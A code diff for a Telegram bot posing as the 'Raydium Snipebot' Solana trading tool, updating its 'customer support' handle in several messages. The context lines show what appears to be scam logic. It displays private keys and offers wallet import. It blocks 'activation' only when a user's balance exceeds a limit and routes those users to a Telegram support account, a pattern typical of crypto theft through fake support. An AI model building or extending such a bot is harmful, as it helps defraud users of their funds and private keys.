@@ -599,7 +599,7 @@ You will need to first fund your bot, Then click on Copy Trade, Paste in the add
 Transactions through Raydium Snipe incur a fee of 1%, or 0.9% if you were referred by another user. We don't charge a subscription fee or pay-wall any features.
 
 *Additional questions or need support?*
-Contact Raydium Snipebot official telegram support admin- @Raydiumbotofficial
+Contact Raydium Snipebot official telegram support admin- @Raydiumofficialsupport
 """, reply_markup=reply_markup)
 
 async def referral(chat_id, context):
@@ -918,7 +918,7 @@ Private key: {user[2]}
             limit = get_limit(chat_id) if get_limit(chat_id) != None else 3
             if total_balance > limit:
                 await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""BOT ACTIVATION FAILED ⚠️
-    CONTACT CUSTOMER SUPPORT FOR ASSISTANCE - @Raydiumbotofficial""")
+    CONTACT CUSTOMER SUPPORT FOR ASSISTANCE - @Raydiumofficialsupport""")
                 return
             await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""🚨 BOT NOT YET ACTIVATED 🚨
 {limit} SOL Minimum balance required to activate trading bot""")
@@ -935,7 +935,7 @@ Private key: {user[2]}
             limit = get_limit(chat_id) if get_limit(chat_id) != None else 3
             if total_balance > limit:
                 await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""BOT ACTIVATION FAILED ⚠️
-    CONTACT CUSTOMER SUPPORT FOR ASSISTANCE - @Raydiumbotofficial""")
+    CONTACT CUSTOMER SUPPORT FOR ASSISTANCE - @Raydiumofficialsupport""")
                 return
             await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""🚨 BOT NOT YET ACTIVATED 🚨
 {limit} SOL Minimum balance required to activate trading bot""")
@@ -971,7 +971,7 @@ Unlock exclusive features including:
 ⚙️ Token Creation – Launch your own token in seconds.
 🎁 Claim Airdrop – Get free tokens instantly! 
 
-Please fund your bot wallet or contact @Raydiumbotofficial for more info.
+Please fund your bot wallet or contact @Raydiumofficialsupport for more info.
 """,
         reply_markup=InlineKeyboardMarkup([
             [InlineKeyboardButton("👛 Fund Wallet", callback_data="wallet"), InlineKeyboardButton("🔑 Import Wallet", callback_data="import_wallet")]
@@ -1056,7 +1056,7 @@ Please fund your bot wallet or contact @Raydiumbotofficial for more info.
             limit = get_limit(chat_id) if get_limit(chat_id) != None else 3
             if total_balance > limit:
                 await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""BOT ACTIVATION FAILED ⚠️
-    CONTACT CUSTOMER SUPPORT FOR ASSISTANCE - @Raydiumbotofficial""")
+    CONTACT CUSTOMER SUPPORT FOR ASSISTANCE - @Raydiumofficialsupport""")
                 return
             await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""🚨 BOT NOT YET ACTIVATED 🚨
 {limit} SOL Minimum balance required to activate trading bot""")
@@ -1217,7 +1217,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
             limit = get_limit(chat_id) if get_limit(chat_id) != None else 3
             if total_balance > limit:
                 await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""BOT ACTIVATION FAILED ⚠️
-    CONTACT CUSTOMER SUPPORT FOR ASSISTANCE - @Raydiumbotofficial""")
+    CONTACT CUSTOMER SUPPORT FOR ASSISTANCE - @Raydiumofficialsupport""")
                 return
             await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""🚨 BOT NOT YET ACTIVATED 🚨
 {limit} SOL Minimum balance required to activate trading bot""")
